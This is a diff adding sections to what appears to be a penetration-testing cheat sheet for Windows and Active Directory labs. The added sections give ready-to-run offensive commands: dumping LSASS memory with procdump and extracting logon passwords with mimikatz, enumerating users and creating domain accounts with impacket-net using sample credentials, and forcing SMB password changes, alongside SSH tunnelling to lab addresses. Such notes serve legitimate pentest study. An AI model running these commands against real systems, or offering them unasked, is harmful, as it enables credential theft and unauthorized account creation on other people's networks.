@@ -117,6 +117,26 @@ rdesktop 192.168.134.165
 
 Execute the [tool](https://github.com/CsEnox/SeManageVolumeExploit/releases/tag/public?source=post_page-----2ebc0077b961---------------------------------------)
 
+### SeDebugPrivilege
+
+- Prepare [procdump.exe](https://learn.microsoft.com/en-us/sysinternals/downloads/procdump)
+
+![debug](/images/etc/debugpriv.png)
+
+- Run cmd as admin
+
+```cmd
+procdump.exe -accepteula -ma lsass.exe lsass.dmp
+```
+
+- Run mimikatz as admin
+
+```cmd
+privilege::debug
+sekurlsa::minidump lsass.dmp
+sekurlsa::logonpasswords
+```
+
 ## GPO
 
 ### ReadGMSAPassword
@@ -304,4 +324,60 @@ ssh -N -R 80:127.0.0.1:80 -R 14147:127.0.0.1:14147 kali@192.168.45.247
 
 ```sh
 ssh -N -L 8000:127.0.0.1:8000 dev@192.168.249.150
+```
+
+## Impacket
+
+### impacket-net
+
+*Prepare vaild domain credentials*
+
+[All detailed reference](https://www.hackingarticles.in/impacket-for-pentester-net/)
+
+- user enum
+
+```sh
+impacket-net ignite.local/raj:Password@192.168.1.8 user
+```
+
+- user details
+
+```sh
+impacket-net ignite.local/raj:Password@192.168.1.8 user -name sanjeet
+```
+
+- create domain user
+
+```sh
+impacket-net ignite.local/administrator:Ignite@192.168.1.8 user -create anubhav -newPasswd Password@987
+```
+
+- enum via kerberos ticket
+
+```sh
+impacket-net ignite.local/administrator@dc.ignite.local -k -no-pass user
+```
+
+## SMB
+
+### smbpasswd
+
+- when SMB error message says "user must change password"
+
+```sh
+smbpasswd -r 192.168.121.123 -U testuser
+Old SMB password:
+New SMB password:
+Retype new SMB password:
+Password changed for user testuser
+```
+
+## mysql
+
+### windows
+
+- terminal oneliner
+
+```cmd
+.\mysql.exe -uroot -e "show databases;"
 ```
